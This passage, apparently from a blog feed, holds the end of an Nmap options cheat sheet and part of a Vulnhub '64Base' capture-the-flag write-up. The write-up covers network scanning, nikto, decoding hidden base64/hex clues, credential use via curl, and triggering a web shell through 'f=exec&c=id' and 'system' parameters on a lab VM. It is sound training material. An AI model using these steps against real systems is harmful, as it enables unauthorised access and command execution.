      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--script-help&lt;/span&gt;=&quot;category&quot;&lt;/th&gt;
      &lt;th&gt;Show help for category&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;output-options&quot;&gt;Output Options&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-oN&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Standard Nmap output&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-oG&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Greppable format&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-oX&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;XML format&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-oA&lt;/span&gt; NAME&lt;/th&gt;
      &lt;th&gt;Generate Nmap, greppable, and XML output files using name for files&lt;/th&gt;
    &lt;/tr&gt;


  &lt;/table&gt;
&lt;/div&gt;

&lt;h1 id=&quot;miscellaneous&quot;&gt;Miscellaneous&lt;/h1&gt;

&lt;div class=&quot;table-responsive&quot;&gt;
  &lt;table class=&quot;table&quot;&gt;
    &lt;thead&gt;
      &lt;tr&gt;
        &lt;th&gt;Parameter&lt;/th&gt;
        &lt;th&gt;Description&lt;/th&gt;
      &lt;/tr&gt;
    &lt;/thead&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-n&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Disable reverse IP address lookups&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-6&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Use IPv6 only&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;-A&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Use scan types including OS detection, version detection, script scanning in default category, and traceroute&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;span class=&quot;text-danger&quot;&gt;--reason&lt;/span&gt;&lt;/th&gt;
      &lt;th&gt;Display reason Nmap thinks port is open, closed, or filtered&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/table&gt;
&lt;/div&gt;

&lt;h1&gt;Last words and references&lt;/h1&gt;

&lt;p&gt;Firstly, I can recommend this great piece of information &lt;a href=&quot;https://nmap.org/book/toc.html&quot;&gt;Nmap Network Scanning Digital Version&lt;/a&gt;, which covers a lot of topics in this amazing tool. In addition I will keep this cheat sheet as update as possible, with new content coming as soon as I'll learn more, so stay updated! And...&lt;/p&gt;

&lt;p&gt;~ Stay safe!&lt;/p&gt;</content><author><name>W3ndige</name></author><category term="Cheat Sheets" /><summary type="html">What is Nmap?</summary></entry><entry><title type="html">Vulnhub.com - 64Base 1.0.1</title><link href="http://localhost:4000/vulnhub-64base-writeup/" rel="alternate" type="text/html" title="Vulnhub.com - 64Base 1.0.1" /><published>2017-02-12T00:00:00+00:00</published><updated>2017-02-12T00:00:00+00:00</updated><id>http://localhost:4000/vulnhub-64base-writeup</id><content type="html" xml:base="http://localhost:4000/vulnhub-64base-writeup/">&lt;h1&gt;Introduction&lt;/h1&gt;

&lt;p&gt;Today we're going to try and complete another challenge from Vulnhub, called 64Base. There are two objectives: the main one is to steal the plans for the Death Star before it's too late, and secondary quest consits of collecting all 6 flags. So without further suppression, let's jump in! &lt;/p&gt;

&lt;h1&gt;Write-Up&lt;/h1&gt;

&lt;p&gt;Firstly, we have to find what IP address was assigned to this machine.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nmap 192.168.56.1/24

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-02-10 15:31 EST
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.1
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.000076s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
All 1000 scanned ports on 192.168.56.1 are closed
MAC Address: 0A:00:27:00:00:00 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.100
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00026s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
All 1000 scanned ports on 192.168.56.100 are filtered
MAC Address: 08:00:27:E5:1B:1D &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.102
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00024s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
Not shown: 997 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
4899/tcp open  radmin
MAC Address: 08:00:27:68:E7:F8 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.101
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0000070s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;.
All 1000 scanned ports on 192.168.56.101 are closed

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 256 IP addresses &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;4 hosts up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;5.50 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Okay, &lt;b&gt;192.168.56.102&lt;/b&gt; is our vulnerable machine. We also have some basic info about the ports - &lt;b&gt;ssh&lt;/b&gt;, &lt;b&gt;http&lt;/b&gt; and &lt;b&gt;radmin&lt;/b&gt;. &lt;/p&gt;

&lt;h2&gt;First flag&lt;/h2&gt;

&lt;p&gt;Let's start by checking the &lt;b&gt;80&lt;/b&gt; port, and the website. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/website-first.png&quot; alt=&quot;Website-First-Look&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What's this random string in the subheader? &lt;b&gt;Base64&lt;/b&gt;? Let's check that out. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;dmlldyBzb3VyY2UgO0QK | base64 -d
view &lt;span class=&quot;nb&quot;&gt;source&lt;/span&gt; ;D&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great clue! After checking the source code, I've noticed this string in &lt;b&gt;header&lt;/b&gt; section of index. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Page Header --&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;c&quot;&gt;&amp;lt;!-- Set your background image for this header on the line below. --&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;header&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;intro-header&quot;&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;style=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;background-image: url('img/home-bg.jpg')&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;container&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;row&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                 &lt;span class=&quot;nt&quot;&gt;&amp;lt;div&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;site-heading&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                     &lt;span class=&quot;nt&quot;&gt;&amp;lt;h1&amp;gt;&lt;/span&gt;64base&lt;span class=&quot;nt&quot;&gt;&amp;lt;/h1&amp;gt;&lt;/span&gt;
                     &lt;span class=&quot;nt&quot;&gt;&amp;lt;hr&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;small&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
                     &lt;span class=&quot;nt&quot;&gt;&amp;lt;span&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;class=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;subheading&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;dmlldyBzb3VyY2UgO0QK&lt;span class=&quot;nt&quot;&gt;&amp;lt;/span&amp;gt;&lt;/span&gt;
                     &lt;span class=&quot;c&quot;&gt;&amp;lt;!--5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a--&amp;gt;&lt;/span&gt;
                 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
             &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
         &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
     &lt;span class=&quot;nt&quot;&gt;&amp;lt;/div&amp;gt;&lt;/span&gt;
 &lt;span class=&quot;nt&quot;&gt;&amp;lt;/header&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;It looks like hexadecimals, which we can try to decode using &lt;b&gt;xxd&lt;/b&gt; tool. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;5a6d78685a7a4637546d705361566c59546d785062464a7654587056656c464953587055616b4a56576b644752574e7151586853534842575555684b6246524551586454656b5a77596d316a4d454e6e5054313943673d3d0a | xxd -r -p
&lt;span class=&quot;nv&quot;&gt;ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;After that, it's just simple base64 decryption.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZmxhZzF7TmpSaVlYTmxPbFJvTXpVelFISXpUakJVWkdGRWNqQXhSSHBWUUhKbFREQXdTekZwYm1jMENnPT19Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
flag1&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Yeah, first flag! But its content also looks like base64. Maybe it will reveal something more? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NjRiYXNlOlRoMzUzQHIzTjBUZGFEcjAxRHpVQHJlTDAwSzFpbmc0Cg&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; | base64 -d
64base:Th353@r3N0TdaDr01DzU@reL00K1ing4&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Password pair? Let's note that for later. &lt;/p&gt;

&lt;h2&gt;Second flag&lt;/h2&gt;

&lt;p&gt;I think that looking at this site manually searching for clues may take ages. &lt;b&gt;Nikto&lt;/b&gt; scan will be great help! &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;nikto -h 192.168.56.102
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.56.102
+ Target Hostname:    192.168.56.102
+ Target Port:        80
+ Start Time:         2017-02-11 08:07:19 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ Server: Apache/2.4.10 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Debian&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Server leaks inodes via ETags, header found with file /, fields: 0x1fdf 0x542f6bd9b68a0
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/88888/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/88888888/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/88888888888/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/88888888888P/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/c3P08P/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/C3p0/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ Entry &lt;span class=&quot;s1&quot;&gt;'/A280/'&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;robots.txt returned a non-forbidden or redirect HTTP code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;200&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
...
+ &lt;span class=&quot;s2&quot;&gt;&quot;robots.txt&quot;&lt;/span&gt; contains 429 entries which should be manually viewed.
+ Apache/2.4.10 appears to be outdated &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;current is at least Apache/2.4.12&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;. Apache 2.0.65 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;final release&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 2.2.29 are also current.
+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting...
+ OSVDB-3268: /mail/: Directory indexing found.
+ OSVDB-3092: /mail/: This might be interesting...
+ OSVDB-3092: /members/: This might be interesting...
+ OSVDB-3092: /order/: This might be interesting...
+ OSVDB-3092: /staff/: This might be interesting...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-3233: /icons/README: Apache default file found.
+ OSVDB-3092: /as/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;American Samoa&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3092: /by/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Belarus&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3092: /is/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Iceland&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3092: /no/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Norway&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ OSVDB-3092: /to/: This might be interesting... potential country code &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Tonga&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ 8115 requests: 0 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 434 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-02-11 08:07:58 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-5&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;39 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
---------------------------------------------------------------------------
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;That's a lot of &lt;b&gt;robots.txt&lt;/b&gt; entries, but it may give us some interesting information. For now, let's save it. &lt;/p&gt;

&lt;p&gt;What I've found even more interesting is this image in the post file. It's just full of this random (or not?) clues. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/website-image.png&quot; alt=&quot;Website-Image&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;b&gt;IMPORTANT!!! USE SYSTEM INSTEAD OF EXEC TO RUN THE SECRET 5H377&lt;/b&gt;&lt;/p&gt;
&lt;p&gt;What can it mean? And this comment under the image? &lt;/p&gt;
&lt;p&gt;&lt;b&gt;Only respond if you are a real Imperial-Class BountyHunter&lt;/b&gt;&lt;/p&gt;

&lt;p&gt;At this moment it won't help us, but saving it for later may come handy.  &lt;/p&gt;

&lt;p&gt;But, wait a minute. &quot;&lt;b&gt;Imperial-class&lt;/b&gt;&quot; also appears in robots.txt file. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;Disallow: /houses/
Disallow: /humans/
Disallow: /Imperial/
Disallow: /Imperial-class/
Disallow: /individual/
Disallow: /initial/
Disallow: /instituted/&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's view it. Even though /Imperial-class/ was empty, I've still tried &lt;b&gt;/Imperial-Class/&lt;/b&gt;, which worked! &lt;/p&gt;
&lt;p&gt;Unfortunately we have another problem, it immediately asks us for login and password. And no known credentials works. Maybe source code will tell us something more?  &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/imperial-class-login.png&quot; alt=&quot;Imperial-Class-Login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that's something useful. We can try to add &lt;b&gt;/BountyHunter&lt;/b&gt; to the URL. Also, do You remember the &quot;...real Imperial-Class BountyHunter&quot;? Great hint! &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/bountyhunter.png&quot; alt=&quot;BountyHunter-Login&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Another login page... Once again I've tried to login as in the previuos form, but this time nothing happened. Maybe source code, once again, will show us something? Yes! I've noticed 3 strings, let's concatenate them together, and decode from hex.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;5a6d78685a7a4a37595568534d474e4954545a4d65546b7a5a444e6a645756584f54466b53465a70576c4d31616d49794d485a6b4d6b597757544a6e4c3252714d544a54626d51315a45566157464655614446525557383966516f3d0a | xxd -r -p
&lt;span class=&quot;nv&quot;&gt;ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now decode this base64. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;ZmxhZzJ7YUhSMGNITTZMeTkzZDNjdWVXOTFkSFZpWlM1amIyMHZkMkYwWTJnL2RqMTJTbmQ1ZEVaWFFUaDFRUW89fQo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
flag2&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo&lt;span class=&quot;o&quot;&gt;=}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And we've got second flag! Four more to go. But firstly, let's decode the inside of the flag, looking for a hint.  &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;aHR0cHM6Ly93d3cueW91dHViZS5jb20vd2F0Y2g/dj12Snd5dEZXQTh1QQo&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
https://www.youtube.com/watch?v&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;vJwytFWA8uA&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Youtube film? &lt;/p&gt;

&lt;h2&gt;Third flag&lt;/h2&gt;

&lt;p&gt;I struggled a lot while trying to get this flag. Even this YouTube video couldn't help me :( After some time, maybe due to my luck, by playing with &lt;b&gt;curl&lt;/b&gt; and &lt;b&gt;login.php&lt;/b&gt; I got the next flag.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;curl -u 64base:Th353@r3N0TdaDr01DzU@reL00K1ing4 &lt;span class=&quot;s2&quot;&gt;&quot;http://192.168.56.102/Imperial-Class/BountyHunter/login.php&quot;&lt;/span&gt;

flag3&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;I've actually tried to login using these credentials, but nothing happened. Luckily, I got it here ;) Now let's decode this flag. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;&lt;span class=&quot;gp&quot;&gt;root@kali:~# &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;NTNjcjN0NWgzNzcvSW1wZXJpYWwtQ2xhc3MvQm91bnR5SHVudGVyL2xvZ2luLnBocD9mPWV4ZWMmYz1pZAo&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; | base64 -d
53cr3t5h377/Imperial-Class/BountyHunter/login.php?f&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;exec&lt;/span&gt;&amp;amp;c&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;id&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;h2&gt;Fourth flag&lt;/h2&gt;

&lt;p&gt;Let's take a look at this link. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/early-shell.png&quot; alt=&quot;Found-Link&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;As I suspected, nothing happened.&lt;/p&gt;
&lt;p&gt;Remember the image from the post page? It said to use system instead of exec. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/64base/shell-system.png&quot; alt=&quot;System-shell&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;That's what I like, another flag! Now, let's decode it. &lt;/p&gt;

